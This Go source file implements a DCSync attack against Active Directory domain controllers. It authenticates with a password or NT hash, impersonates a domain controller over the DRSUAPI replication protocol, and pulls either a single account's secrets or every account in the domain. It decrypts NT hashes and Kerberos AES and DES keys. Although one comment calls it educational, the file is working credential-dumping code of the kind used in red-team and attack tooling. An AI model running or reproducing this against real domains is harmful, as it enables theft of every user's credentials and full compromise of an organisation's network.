package dcsync

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/ad"
	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

var mechanismOnce sync.Once

// DRSR interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
// This is the DRSUAPI interface used for AD replication

// DRSRClient wraps the go-msrpc DRSR client.
//
// EDUCATIONAL: DRSR (Directory Replication Service Remote Protocol)
//
// DRSR is the protocol DCs use to replicate AD data. DCSync abuses this
// by impersonating a DC to request password data.
type DRSRClient struct {
	conn      dcerpc.Conn
	client    drsuapi.DrsuapiClient
	drsHandle *drsuapi.Handle
	domainDN  string
}

// NewDRSRClient creates a new DRSR client connected to the DC.
// Based on the official go-msrpc drsr_secrets_dump.go example.
func NewDRSRClient(ctx context.Context, req *DCSyncRequest) (*DRSRClient, error) {
	// Build domain DN from domain name
	domainDN := domainToDN(req.Domain)

	// Add credentials to GSSAPI context
	if req.Password != "" {
		gssapi.AddCredential(credential.NewFromPassword(req.Username, req.Password,
			credential.Domain(strings.ToUpper(req.Domain))))
	} else if len(req.NTHash) == 16 {
		gssapi.AddCredential(credential.NewFromNTHashBytes(req.Username, req.NTHash,
			credential.Domain(strings.ToUpper(req.Domain))))
	}

	// Add mechanisms (only once)
	mechanismOnce.Do(func() {
		gssapi.AddMechanism(ssp.SPNEGO)
		gssapi.AddMechanism(ssp.NTLM)
	})

	fmt.Printf("[*] Auth: %s\\%s @ %s\n", strings.ToUpper(req.Domain), req.Username, req.DC)

	// Create security context
	ctx = gssapi.NewSecurityContext(ctx)

	// Connect using endpoint mapper (matches official example)
	endpoint := "ncacn_ip_tcp:" + req.DC
	fmt.Printf("[*] Connecting to endpoint: %s\n", endpoint)

	cc, err := dcerpc.Dial(ctx, endpoint,
		epm.EndpointMapper(ctx,
			net.JoinHostPort(req.DC, "135"),
			dcerpc.WithInsecure(),
		))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DC: %w", err)
	}

	// Create DRSUAPI client with sealing and target name (matches official example)
	client, err := drsuapi.NewDrsuapiClient(ctx, cc,
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(req.DC))
	if err != nil {
		cc.Close(ctx)
		return nil, fmt.Errorf("failed to create DRSR client: %w", err)
	}

	return &DRSRClient{
		conn:     cc,
		client:   client,
		domainDN: domainDN,
	}, nil
}

// Close closes the DRSR connection.
func (c *DRSRClient) Close() {
	if c.conn != nil {
		c.conn.Close(context.Background())
	}
}

// Bind performs DsBind to get a replication handle.
// Based on official go-msrpc example.
func (c *DRSRClient) Bind(ctx context.Context) error {
	// Build client capabilities using ExtensionsInt (matches official example)
	clientCaps := drsuapi.ExtensionsInt{
		Flags: drsuapi.ExtGetNCChangesRequestV8 | drsuapi.ExtStrongEncryption | drsuapi.ExtGetNCChangesReplyV6,
	}

	// Marshal to bytes
	b, err := ndr.Marshal(&clientCaps, ndr.Opaque)
	if err != nil {
		return fmt.Errorf("failed to marshal extensions: %w", err)
	}

	resp, err := c.client.Bind(ctx, &drsuapi.BindRequest{
		Client: &drsuapi.Extensions{Data: b},
	})
	if err != nil {
		return fmt.Errorf("DsBind RPC failed: %w", err)
	}

	if resp.Return != 0 {
		return fmt.Errorf("DsBind returned error: 0x%08x (%d)", resp.Return, resp.Return)
	}

	c.drsHandle = resp.DRS

	return nil
}

// CrackName resolves a SAMAccountName to GUID using DsCrackNames.
// Based on official go-msrpc example.
func (c *DRSRClient) CrackName(ctx context.Context, name string) (string, error) {
	// Extract NETBIOS domain from DN (DC=rootshell,DC=ninja -> ROOTSHELL)
	domainPart := strings.Split(c.domainDN, ",")[0] // "DC=rootshell"
	netbiosDomain := strings.ToUpper(strings.TrimPrefix(domainPart, "DC="))

	// Use NT4 format: DOMAIN\username
	nt4Name := fmt.Sprintf("%s\\%s", netbiosDomain, name)
	fmt.Printf("[*] CrackNames lookup: %s\n", nt4Name)

	resp, err := c.client.CrackNames(ctx, &drsuapi.CrackNamesRequest{
		Handle:    c.drsHandle,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: uint32(drsuapi.DSNameFormatNT4AccountName), // DOMAIN\user format
					Names:         []string{nt4Name},
					FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
				},
			},
		},
	})
	if err != nil {
		return "", fmt.Errorf("CrackNames RPC failed: %w", err)
	}

	if resp.Return != 0 {
		return "", fmt.Errorf("CrackNames returned error: 0x%08x", resp.Return)
	}

	// Parse response
	v1Reply, ok := resp.Out.Value.(*drsuapi.MessageCrackNamesReply_V1)
	if !ok || v1Reply == nil || v1Reply.V1 == nil {
		return "", fmt.Errorf("unexpected CrackNames response type")
	}

	items := v1Reply.V1.Result.Items
	if len(items) == 0 || items[0].Status != 0 {
		status := uint32(0)
		if len(items) > 0 {
			status = items[0].Status
		}
		return "", fmt.Errorf("CrackNames failed with status: %d", status)
	}

	// Return the GUID string
	return items[0].Name, nil
}

// GetNCChanges requests replication of a user's secrets.
// Based on official go-msrpc example.
func (c *DRSRClient) GetNCChanges(ctx context.Context, guidStr string) (*DCSyncResult, error) {
	// Parse GUID
	parsedGUID, err := uuid.Parse(guidStr)
	if err != nil {
		return nil, fmt.Errorf("failed to parse GUID: %w", err)
	}

	resp, err := c.client.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
		Handle:    c.drsHandle,
		InVersion: 8,
		In: &drsuapi.MessageGetNCChangesRequest{
			Value: &drsuapi.MessageGetNCChangesRequest_V8{
				V8: &drsuapi.MessageGetNCChangesRequestV8{
					MaxObjectsCount: 1,
					NC: &drsuapi.DSName{
						GUID: dtyp.GUIDFromUUID(parsedGUID),
					},
					// Use flags from official example
					Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
					ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
				},
			},
		},
	})
	if err != nil {
		return nil, fmt.Errorf("DsGetNCChanges RPC failed: %w", err)
	}

	if resp.Return != 0 {
		return nil, fmt.Errorf("DsGetNCChanges returned error: 0x%08x", resp.Return)
	}

	return c.parseResponse(ctx, resp)
}

// ReplicateNC performs full Naming Context replication (secretsdump style).
// This gets ALL objects in the domain and extracts credentials from users.
func (c *DRSRClient) ReplicateNC(ctx context.Context) ([]*DCSyncResult, error) {
	results := make([]*DCSyncResult, 0)

	// Request replication of the entire domain NC
	// No EXOP - just regular replication
	var cookie *drsuapi.Vector

	for {
		resp, err := c.client.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
			Handle:    c.drsHandle,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						NC: &drsuapi.DSName{
							StringName: c.domainDN,
						},
						From: cookie,
						// Flags for full NC replication
						Flags:           drsuapi.InitSync | drsuapi.WritableReplica | drsuapi.NeverSynced,
						MaxObjectsCount: 1000,
						MaxBytesCount:   10 * 1024 * 1024, // 10MB
						// No extended operation - full replication
						ExtendedOperation: 0,
					},
				},
			},
		})
		if err != nil {
			return nil, fmt.Errorf("ReplicateNC RPC failed: %w", err)
		}

		if resp.Return != 0 {
			return nil, fmt.Errorf("ReplicateNC returned error: 0x%08x", resp.Return)
		}

		// Parse the response and extract user credentials
		userResults, moreData, newCookie, err := c.parseNCReplication(ctx, resp)
		if err != nil {
			return nil, fmt.Errorf("failed to parse replication: %w", err)
		}

		results = append(results, userResults...)

		if !moreData {
			break
		}

		cookie = newCookie
	}

	return results, nil
}

// parseNCReplication extracts user credentials from NC replication response.
// Returns: results, moreData flag, continuation cookie, error
func (c *DRSRClient) parseNCReplication(ctx context.Context, resp *drsuapi.GetNCChangesResponse) ([]*DCSyncResult, bool, *drsuapi.Vector, error) {
	results := make([]*DCSyncResult, 0)

	if resp.Out == nil {
		return nil, false, nil, nil
	}

	reply, ok := resp.Out.Value.(*drsuapi.MessageGetNCChangesReply_V6)
	if !ok || reply == nil || reply.V6 == nil {
		return nil, false, nil, fmt.Errorf("expected V6 response")
	}

	v6 := reply.V6
	prefixes := v6.PrefixTableSource.Build()

	// Iterate through all replicated objects
	for obj := v6.Objects; obj != nil; obj = obj.NextEntityInfo {
		if obj.EntityInfo == nil || obj.EntityInfo.AttributeBlock.Attribute == nil {
			continue
		}

		result := &DCSyncResult{}
		var rid uint32 = 0
		var encryptedPwd []byte
		var isUser bool

		// First pass: extract all attributes
		for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
			oid, err := prefixes.AttributeToOID(attr.AttributeType)
			if err != nil {
				continue
			}

			for i := range attr.AttributeValue.Values {
				name, val, err := ad.ParseNameAndValue(oid, attr.AttributeValue.Values[i].Value, prefixes)
				if err != nil {
					continue
				}

				switch name {
				case "sAMAccountName":
					if s, ok := val.(string); ok {
						result.SAMAccountName = s
					}
				case "objectSid":
					if sid, ok := val.(*dtyp.SID); ok && sid != nil {
						result.ObjectSID = sid.String()
						if len(sid.SubAuthority) > 0 {
							rid = sid.SubAuthority[len(sid.SubAuthority)-1]
						}
					}
				case "unicodePwd":
					if b, ok := val.([]byte); ok && len(b) != 0 {
						encryptedPwd = b
						isUser = true // Has password = is a user
					}
				case "objectClass":
					// Check if it's a user object
					if s, ok := val.(string); ok && s == "user" {
						isUser = true
					}
				}
			}
		}

		// Only process user objects with passwords
		if !isUser || len(encryptedPwd) == 0 || result.SAMAccountName == "" {
			continue
		}

		// Decrypt the hash
		if rid > 0 {
			pwd, err := drsuapi.DecryptHash(c.client.Conn().Context(), rid, encryptedPwd)
			if err == nil {
				result.NTHash = pwd
			}
		}

		results = append(results, result)
	}

	return results, v6.MoreData, v6.To, nil
}

// Based on official go-msrpc example.
func (c *DRSRClient) parseResponse(ctx context.Context, resp *drsuapi.GetNCChangesResponse) (*DCSyncResult, error) {
	result := &DCSyncResult{}

	if resp.Out == nil {
		return nil, fmt.Errorf("empty response")
	}

	reply, ok := resp.Out.Value.(*drsuapi.MessageGetNCChangesReply_V6)
	if !ok || reply == nil || reply.V6 == nil {
		return nil, fmt.Errorf("expected V6 response, got different version")
	}

	v6 := reply.V6

	if v6.Objects == nil || v6.Objects.EntityInfo == nil {
		return nil, fmt.Errorf("no objects in response")
	}

	// Build prefix table for OID lookups
	prefixes := v6.PrefixTableSource.Build()

	// First pass: get objectSid to extract RID needed for decryption
	var rid uint32 = 0
	var encryptedPwd []byte
	var encryptedSupp []byte

	for _, attr := range v6.Objects.EntityInfo.AttributeBlock.Attribute {
		oid, err := prefixes.AttributeToOID(attr.AttributeType)
		if err != nil {
			continue
		}

		for i := range attr.AttributeValue.Values {
			name, val, err := ad.ParseNameAndValue(oid, attr.AttributeValue.Values[i].Value, prefixes)
			if err != nil {
				continue
			}

			switch name {
			case "sAMAccountName":
				if s, ok := val.(string); ok {
					result.SAMAccountName = s
				}
			case "objectSid":
				if sid, ok := val.(*dtyp.SID); ok && sid != nil {
					result.ObjectSID = sid.String()
					// Get RID (last SubAuthority)
					if len(sid.SubAuthority) > 0 {
						rid = sid.SubAuthority[len(sid.SubAuthority)-1]
					}
				}
			case "unicodePwd":
				if b, ok := val.([]byte); ok && len(b) != 0 {
					encryptedPwd = b
				}
			case "supplementalCredentials":
				if b, ok := val.([]byte); ok && len(b) != 0 {
					encryptedSupp = b
				}
			}
		}
	}

	// Now decrypt with the correct RID
	if len(encryptedPwd) > 0 && rid > 0 {
		fmt.Printf("[*] Decrypting hash for RID: %d\n", rid)
		pwd, err := drsuapi.DecryptHash(c.client.Conn().Context(), rid, encryptedPwd)
		if err != nil {
			fmt.Printf("[!] Failed to decrypt hash: %v\n", err)
		} else {
			result.NTHash = pwd
		}
	}

	if len(encryptedSupp) > 0 {
		creds, err := drsuapi.DecryptData(c.client.Conn().Context(), encryptedSupp)
		if err != nil {
			fmt.Printf("[!] Failed to decrypt supplemental creds: %v\n", err)
		} else {
			// Parse supplemental credentials for Kerberos keys
			props := samr.UserProperties{}
			if err := ndr.Unmarshal(creds, &props, ndr.Opaque); err != nil {
				fmt.Printf("[!] Failed to parse supplemental creds: %v\n", err)
			} else {
				result.SupplementalRaw = creds
				parseSupplementalCredentials(&props, result)
			}
		}
	}

	return result, nil
}

func parseSupplementalCredentials(props *samr.UserProperties, result *DCSyncResult) {
	// Kerberos key type constants
	const (
		KERB_ETYPE_DES_CBC_CRC         = 1
		KERB_ETYPE_DES_CBC_MD5         = 3
		KERB_ETYPE_AES128_CTS_HMAC_SHA = 17
		KERB_ETYPE_AES256_CTS_HMAC_SHA = 18
		KERB_ETYPE_RC4_HMAC            = 23
	)

	// Look for Kerberos keys in the properties
	for _, prop := range props.UserProperties {
		if prop == nil || prop.PropertyValue == nil {
			continue
		}

		// Check for Kerberos-Newer-Keys property
		if prop.PropertyName == "Primary:Kerberos-Newer-Keys" {
			if kerbNew, ok := prop.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredentialNew); ok && kerbNew != nil {
				cred := kerbNew.KerberosStoredCredentialNew
				if cred != nil {
					// Extract keys from credentials
					for _, key := range cred.Credentials {
						if key == nil {
							continue
						}
						switch key.KeyType {
						case KERB_ETYPE_AES256_CTS_HMAC_SHA:
							if len(key.KeyData) == 32 {
								result.AES256 = key.KeyData
							}
						case KERB_ETYPE_AES128_CTS_HMAC_SHA:
							if len(key.KeyData) == 16 {
								result.AES128 = key.KeyData
							}
						case KERB_ETYPE_DES_CBC_MD5, KERB_ETYPE_DES_CBC_CRC:
							if len(key.KeyData) == 8 {
								result.DESKeys = key.KeyData
							}
						}
					}
				}
			}
		}

		// Also check older Kerberos property
		if prop.PropertyName == "Primary:Kerberos" {
			if kerb, ok := prop.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredential); ok && kerb != nil {
				cred := kerb.KerberosStoredCredential
				if cred != nil {
					for _, key := range cred.Credentials {
						if key == nil {
							continue
						}
						// Older format typically has DES and RC4
						switch key.KeyType {
						case KERB_ETYPE_DES_CBC_MD5, KERB_ETYPE_DES_CBC_CRC:
							if len(key.KeyData) == 8 && len(result.DESKeys) == 0 {
								result.DESKeys = key.KeyData
							}
						}
					}
				}
			}
		}
	}
}

func parseUint32(s string) (uint32, error) {
	val, err := fmt.Sscanf(s, "%d", new(uint32))
	if err != nil || val != 1 {
		return 0, fmt.Errorf("invalid uint32: %s", s)
	}
	var result uint32
	fmt.Sscanf(s, "%d", &result)
	return result, nil
}

func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dn []string
	for _, part := range parts {
		dn = append(dn, "DC="+part)
	}
	return strings.Join(dn, ",")
}

// Debug helper
var _ = hex.EncodeToString
var _ = os.Stderr
